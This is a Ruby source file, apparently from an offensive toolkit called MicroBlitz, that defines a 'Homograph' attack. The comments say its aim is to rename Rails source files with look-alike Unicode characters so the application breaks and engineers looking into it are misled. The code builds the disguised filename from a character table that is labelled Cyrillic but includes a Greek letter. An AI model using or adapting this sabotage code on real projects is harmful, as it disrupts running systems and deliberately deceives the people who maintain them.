module MicroBlitz
  class Homograph
    # Homograph is an attack vector utilizing a method of deception wherein
    # a threat actor (MicroBlitz) leverages the similarities of character
    # scripts to rename existing filenames to include a look-alike
    # character from a different language.
    #
    # This will cause rails to throw an error as it's looking for that file.
    # The unsuspecting engineer will login to the server only to see the filename
    # has not change (so they think) and will go looking elsewhere.

    def initialize(file)
      @file = file.sub(".rb", "")
    end

    def attack
      raise ::MissingFileError, "File path unknown" unless @file
      find_and_replace_chars @file.chars
    end

    def find_and_replace_chars(chars)
      homograph_attack_char = []

      chars.each do |char|
        if CRYLLIC_LOWERCASE.keys.include? char
          homograph_char = CRYLLIC_LOWERCASE.values_at(char).first
          homograph_attack_char.push(homograph_char)
        else
          homograph_attack_char.push(char)
        end
      end

      homograph_attack_char.push(".rb").join
    end

    CRYLLIC_LOWERCASE = {
      "a" => "\u{0430}",
      "c" => "\u{03F2}",
      "e" => "\u{0435}",
      "i" => "\u{0456}",
      "j" => "\u{0458}",
      "o" => "\u{043E}",
      "p" => "\u{0440}",
      "q" => "\u{051B}",
      "s" => "\u{0455}",
      "w" => "\u{051D}"
    }.freeze
  end
end
